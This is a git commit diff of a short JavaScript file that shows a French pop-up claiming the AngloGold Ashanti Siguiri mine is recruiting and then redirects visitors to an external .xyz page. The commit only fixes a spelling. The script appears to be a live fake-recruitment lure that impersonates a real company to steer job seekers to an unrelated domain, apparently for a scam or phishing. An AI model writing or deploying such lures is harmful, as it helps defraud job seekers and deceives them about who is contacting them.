a95add1dfc09f0d5c89dd527f4d1598890bb1fac
bigetijazz28 <bigetijazz28@gmail.com>
2025-08-21 12:02:45 +0100

    Update siguiri.js

--- siguiri.js
+++ siguiri.js
@@ -1,6 +1,6 @@
 
-var password = 'Siguiri Recruitment'
-password=prompt('AVIS: La mine AngloGold Ashanti Siguiri recrute actuellement, appuyez sur OK pour postuler.','Siguiri Recruitment');
-if (password != 'Siguiri Recruitment') {
+var password = 'Siguiri Recrutement'
+password=prompt('AVIS: La mine AngloGold Ashanti Siguiri recrute actuellement, appuyez sur OK pour postuler.','Siguiri Recrutement');
+if (password != 'Siguiri Recrutement') {
 location.href='https://www.ekuula.xyz/Siguiri-Mine-Recrutement';
 }
